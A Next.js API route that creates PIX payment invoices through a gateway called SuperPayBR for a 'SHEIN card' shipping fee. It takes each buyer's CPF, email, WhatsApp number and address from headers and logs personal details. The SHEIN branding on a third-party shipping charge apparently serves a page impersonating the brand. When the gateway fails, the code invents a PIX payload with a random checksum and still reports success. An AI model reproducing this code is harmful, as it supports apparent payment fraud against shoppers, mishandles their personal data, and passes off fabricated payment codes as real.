import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🚀 === CRIANDO FATURA PIX SUPERPAYBR ===")

    const { amount, shipping, method } = await request.json()
    console.log("📋 Dados recebidos:", { amount, shipping, method })

    // Obter dados dos headers
    const cpfData = JSON.parse(request.headers.get("x-cpf-data") || "{}")
    const userEmail = request.headers.get("x-user-email") || ""
    const userWhatsApp = request.headers.get("x-user-whatsapp") || ""
    const deliveryAddress = JSON.parse(request.headers.get("x-delivery-address") || "{}")

    console.log("👤 Dados do cliente:", {
      nome: cpfData.nome,
      cpf: cpfData.cpf,
      email: userEmail,
    })

    // Gerar External ID único
    const externalId = `SHEIN_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
    console.log("🆔 External ID gerado:", externalId)

    // Obter token de autenticação
    console.log("🔐 Obtendo token SuperPayBR...")
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })

    if (!authResponse.ok) {
      console.log("❌ Falha na autenticação SuperPayBR")
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const authData = await authResponse.json()
    const accessToken = authData.access_token || authData.token

    if (!accessToken) {
      console.log("❌ Token SuperPayBR não obtido")
      throw new Error("Token SuperPayBR não obtido")
    }

    console.log("✅ Token SuperPayBR obtido com sucesso")

    // Preparar dados da fatura SuperPayBR
    const invoiceData = {
      client: {
        name: cpfData.nome || "Cliente SHEIN",
        document: cpfData.cpf?.replace(/\D/g, "") || "00000000000",
        email: userEmail || "cliente@shein.com",
        phone: userWhatsApp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: deliveryAddress.street || "Rua Principal",
          number: deliveryAddress.number || "123",
          neighborhood: deliveryAddress.neighborhood || "Centro",
          city: deliveryAddress.city || "São Paulo",
          state: deliveryAddress.state || "SP",
          zipcode: deliveryAddress.zipcode?.replace(/\D/g, "") || "01001000",
          complement: deliveryAddress.complement || "",
        },
        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_FRETE_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            title: `Frete ${method} - Cartão SHEIN`,
            qnt: 1,
            amount: Number.parseFloat(amount),
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Dados da fatura preparados:", {
      external_id: externalId,
      amount: Number.parseFloat(amount),
      client_name: invoiceData.client.name,
    })

    // Criar fatura na SuperPayBR
    const apiUrl = process.env.SUPERPAY_API_URL
    const createUrl = `${apiUrl}/v4/invoices`

    console.log("🌐 Enviando para SuperPayBR:", {
      url: createUrl,
      method: "POST",
      has_token: !!accessToken,
    })

    const createResponse = await fetch(createUrl, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent": "SHEIN-Card-System/1.0",
      },
      body: JSON.stringify(invoiceData),
    })

    console.log("📥 Resposta da criação:", {
      status: createResponse.status,
      statusText: createResponse.statusText,
      ok: createResponse.ok,
    })

    if (!createResponse.ok) {
      const errorText = await createResponse.text()
      console.log("❌ Erro na criação da fatura SuperPayBR:", errorText)
      throw new Error(`Erro SuperPayBR: ${createResponse.status} - ${errorText}`)
    }

    const responseData = await createResponse.json()
    console.log("📋 Resposta completa SuperPayBR:", JSON.stringify(responseData, null, 2))

    // Buscar PIX payload recursivamente
    let pixPayload = ""
    let qrCodeImage = ""

    const findPixData = (obj: any, path = ""): void => {
      if (!obj || typeof obj !== "object") return

      for (const [key, value] of Object.entries(obj)) {
        const currentPath = path ? `${path}.${key}` : key

        // Buscar PIX payload
        if (key === "payload" && typeof value === "string" && value.length > 50) {
          pixPayload = value
          console.log(`🔍 PIX payload encontrado em: ${currentPath}`)
        }

        // Buscar PIX code alternativo
        if (key === "pix_code" && typeof value === "string" && value.length > 50) {
          pixPayload = value
          console.log(`🔍 PIX code encontrado em: ${currentPath}`)
        }

        // Buscar QR Code image
        if ((key === "qrcode" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
          console.log(`🔍 QR Code encontrado em: ${currentPath}`)
        }

        // Continuar busca recursiva
        if (typeof value === "object" && value !== null) {
          findPixData(value, currentPath)
        }
      }
    }

    findPixData(responseData)

    console.log("🔍 Resultado da extração PIX:", {
      pixPayload: pixPayload ? `✅ ENCONTRADO (${pixPayload.length} chars)` : "❌ NÃO ENCONTRADO",
      qrCodeImage: qrCodeImage ? "✅ ENCONTRADO" : "❌ NÃO ENCONTRADO",
    })

    // PIX de emergência se não encontrado
    if (!pixPayload) {
      console.log("⚠️ PIX payload não encontrado, gerando PIX de emergência...")
      const totalAmount = Number.parseFloat(amount)
      pixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${totalAmount.toFixed(
        2,
      )}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
    }

    // Gerar QR Code via QuickChart sempre
    const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=250&format=png&margin=1`
    console.log("🔍 QR Code gerado via QuickChart:", qrCodeUrl)

    // Resposta no formato TryploPay
    const response = {
      success: true,
      data: {
        fatura: {
          id: responseData.data?.id || responseData.id || externalId,
          invoice_id: responseData.data?.invoice_id || responseData.invoice_id || externalId,
          external_id: externalId,
          pix: {
            payload: pixPayload,
            image: qrCodeUrl,
            qr_code: qrCodeUrl,
          },
          status: {
            code: responseData.data?.status?.code || responseData.status?.code || 1,
            title: responseData.data?.status?.title || responseData.status?.title || "Aguardando Pagamento",
            text: "pending",
          },
          valores: {
            bruto: Math.round(Number.parseFloat(amount) * 100),
            liquido: Math.round(Number.parseFloat(amount) * 100),
          },
          vencimento: {
            dia: new Date(Date.now() + 2 * 60 * 60 * 1000).toISOString().split("T")[0],
          },
          type: "real",
        },
      },
    }

    console.log("✅ Fatura SuperPayBR criada com sucesso!")
    console.log("📋 Resposta formatada no padrão TryploPay")

    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura SuperPayBR:", error)

    // PIX de fallback em caso de erro
    const fallbackExternalId = `FALLBACK_${Date.now()}`
    const totalAmount = Number.parseFloat(request.body?.amount || "34.90")
    const fallbackPixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${fallbackExternalId}520400005303986540${totalAmount.toFixed(
      2,
    )}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`

    return NextResponse.json({
      success: true,
      data: {
        fatura: {
          id: fallbackExternalId,
          invoice_id: fallbackExternalId,
          external_id: fallbackExternalId,
          pix: {
            payload: fallbackPixPayload,
            image: `https://quickchart.io/qr?text=${encodeURIComponent(fallbackPixPayload)}&size=250&format=png&margin=1`,
            qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(fallbackPixPayload)}&size=250&format=png&margin=1`,
          },
          status: {
            code: 1,
            title: "Aguardando Pagamento (Fallback)",
            text: "pending",
          },
          valores: {
            bruto: Math.round(totalAmount * 100),
            liquido: Math.round(totalAmount * 100),
          },
          vencimento: {
            dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
          },
          type: "emergency",
        },
      },
      fallback: true,
      error: error instanceof Error ? error.message : "Erro desconhecido",
    })
  }
}

export async function GET() {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
